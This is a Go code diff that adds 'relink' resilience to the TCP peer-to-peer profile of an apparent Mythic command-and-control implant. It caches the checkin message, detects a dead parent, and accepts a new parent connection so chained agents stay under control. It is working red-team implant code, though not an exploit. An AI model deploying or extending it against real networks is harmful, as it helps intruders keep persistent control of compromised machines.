@@ -47,6 +47,12 @@ type TCPProfile struct {
 
 	// Listener for incoming P2P connections
 	listener net.Listener
+
+	// Relink support: stored checkin data so child can re-checkin with a new parent
+	cachedCheckinData []byte // base64-encoded checkin message (UUID + encrypted body)
+	needsParent       bool   // set when parent disconnects; next accepted connection becomes parent
+	needsParentMu     sync.Mutex
+	parentReady       chan struct{} // signaled when a new parent connection is established
 }
 
 // NewTCPProfile creates a new TCP profile for P2P communication.
@@ -60,6 +66,7 @@ func NewTCPProfile(bindAddress, encryptionKey string, debug bool) *TCPProfile {
 		OutboundDelegates: make(chan []structs.DelegateMessage, 100),
 		EdgeMessages:      make(chan structs.P2PConnectionMessage, 20),
 		uuidMapping:       make(map[string]string),
+		parentReady:       make(chan struct{}, 1),
 	}
 }
 
@@ -121,6 +128,9 @@ func (t *TCPProfile) Checkin(agent *structs.Agent) error {
 	messageData := append([]byte(agent.PayloadUUID), body...)
 	encodedData := base64.StdEncoding.EncodeToString(messageData)
 
+	// Cache checkin data for potential relink
+	t.cachedCheckinData = []byte(encodedData)
+
 	// Send via TCP (length-prefixed)
 	if err := t.sendTCP(conn, []byte(encodedData)); err != nil {
 		return fmt.Errorf("failed to send checkin: %w", err)
@@ -181,7 +191,9 @@ func (t *TCPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.So
 	t.parentMu.Unlock()
 
 	if conn == nil {
-		return nil, nil, fmt.Errorf("no parent connection")
+		// Parent is dead — trigger relink and wait for a new parent
+		t.triggerRelink()
+		return nil, nil, fmt.Errorf("no parent connection, waiting for relink")
 	}
 
 	// Collect any delegate messages from children to forward upstream
@@ -220,11 +232,13 @@ done:
 	encodedData := base64.StdEncoding.EncodeToString(messageData)
 
 	if err := t.sendTCP(conn, []byte(encodedData)); err != nil {
+		t.handleDeadParent()
 		return nil, nil, fmt.Errorf("failed to send tasking request: %w", err)
 	}
 
 	respData, err := t.recvTCP(conn)
 	if err != nil {
+		t.handleDeadParent()
 		return nil, nil, fmt.Errorf("failed to receive tasking response: %w", err)
 	}
 
@@ -292,7 +306,7 @@ func (t *TCPProfile) PostResponse(response structs.Response, agent *structs.Agen
 	t.parentMu.Unlock()
 
 	if conn == nil {
-		return nil, fmt.Errorf("no parent connection")
+		return nil, fmt.Errorf("no parent connection, waiting for relink")
 	}
 
 	// Collect delegate messages and edge notifications
@@ -340,11 +354,13 @@ doneEdges:
 	encodedData := base64.StdEncoding.EncodeToString(messageData)
 
 	if err := t.sendTCP(conn, []byte(encodedData)); err != nil {
+		t.handleDeadParent()
 		return nil, fmt.Errorf("failed to send response: %w", err)
 	}
 
 	respData, err := t.recvTCP(conn)
 	if err != nil {
+		t.handleDeadParent()
 		return nil, fmt.Errorf("failed to receive PostResponse reply: %w", err)
 	}
 
@@ -444,8 +460,50 @@ func (t *TCPProfile) RouteToChildren(delegates []structs.DelegateMessage) {
 
 // --- Internal methods ---
 
+// handleDeadParent marks the parent connection as dead and triggers relink.
+func (t *TCPProfile) handleDeadParent() {
+	t.parentMu.Lock()
+	if t.parentConn != nil {
+		t.parentConn.Close()
+		t.parentConn = nil
+	}
+	t.parentMu.Unlock()
+
+	t.needsParentMu.Lock()
+	t.needsParent = true
+	t.needsParentMu.Unlock()
+
+	log.Printf("[TCP] Parent connection dead, waiting for relink")
+}
+
+// triggerRelink signals that this agent needs a new parent and blocks until one connects.
+func (t *TCPProfile) triggerRelink() {
+	t.needsParentMu.Lock()
+	alreadyNeeds := t.needsParent
+	t.needsParent = true
+	t.needsParentMu.Unlock()
+
+	// No listener means no way to accept a new parent — don't block
+	if t.listener == nil {
+		return
+	}
+
+	if !alreadyNeeds {
+		log.Printf("[TCP] Triggering relink — waiting for new parent connection")
+	}
+
+	// Wait for acceptChildConnections to provide a new parent (with timeout)
+	// The main loop will retry after its normal sleep interval
+	select {
+	case <-t.parentReady:
+		log.Printf("[TCP] New parent connected via relink")
+	case <-time.After(5 * time.Second):
+		// Short wait — main loop will retry
+	}
+}
+
 // acceptChildConnections keeps accepting new TCP connections after initial checkin.
-// These are additional child agents linking to this agent.
+// These are additional child agents linking to this agent, OR a new parent during relink.
 func (t *TCPProfile) acceptChildConnections() {
 	if t.listener == nil {
 		return
@@ -458,10 +516,82 @@ func (t *TCPProfile) acceptChildConnections() {
 			log.Printf("[TCP] Accept error: %v", err)
 			return
 		}
-		log.Printf("[TCP] New child connection from %s", conn.RemoteAddr())
-		// The child will send its checkin data — read it and register
-		go t.handleNewChildCheckin(conn)
+
+		// Check if we need a new parent (relink scenario)
+		t.needsParentMu.Lock()
+		needsParent := t.needsParent
+		t.needsParentMu.Unlock()
+
+		if needsParent {
+			log.Printf("[TCP] New parent connection from %s (relink)", conn.RemoteAddr())
+			go t.handleRelink(conn)
+		} else {
+			log.Printf("[TCP] New child connection from %s", conn.RemoteAddr())
+			go t.handleNewChildCheckin(conn)
+		}
 	}
+}
+
+// handleRelink handles a new parent connection after the previous parent disconnected.
+// It re-sends the cached checkin data so the new parent can forward it to Mythic as a delegate.
+func (t *TCPProfile) handleRelink(conn net.Conn) {
+	if len(t.cachedCheckinData) == 0 {
+		log.Printf("[TCP] No cached checkin data for relink, treating as child")
+		t.handleNewChildCheckin(conn)
+		return
+	}
+
+	// Send cached checkin data to the new parent
+	if err := t.sendTCP(conn, t.cachedCheckinData); err != nil {
+		log.Printf("[TCP] Failed to send checkin to new parent: %v", err)
+		conn.Close()
+		return
+	}
+	log.Printf("[TCP] Sent cached checkin to new parent")
+
+	// Read checkin response from parent (Mythic's response forwarded by parent)
+	respData, err := t.recvTCP(conn)
+	if err != nil {
+		log.Printf("[TCP] Failed to receive relink checkin response: %v", err)
+		conn.Close()
+		return
+	}
+
+	// Process response — update callback UUID if provided
+	if t.EncryptionKey != "" {
+		decodedData, err := base64.StdEncoding.DecodeString(string(respData))
+		if err == nil {
+			decryptedResponse, err := t.decryptResponse(decodedData)
+			if err == nil {
+				var checkinResponse map[string]interface{}
+				if err := json.Unmarshal(decryptedResponse, &checkinResponse); err == nil {
+					if callbackID, exists := checkinResponse["id"]; exists {
+						if callbackStr, ok := callbackID.(string); ok {
+							t.CallbackUUID = callbackStr
+						}
+					}
+				}
+			}
+		}
+	}
+
+	// Set as new parent connection
+	t.parentMu.Lock()
+	t.parentConn = conn
+	t.parentMu.Unlock()
+
+	// Clear the needs-parent flag
+	t.needsParentMu.Lock()
+	t.needsParent = false
+	t.needsParentMu.Unlock()
+
+	// Signal that parent is ready
+	select {
+	case t.parentReady <- struct{}{}:
+	default:
+	}
+
+	log.Printf("[TCP] Relink complete — new parent from %s", conn.RemoteAddr())
 }
 
 // handleNewChildCheckin reads the initial checkin from a new child connection,
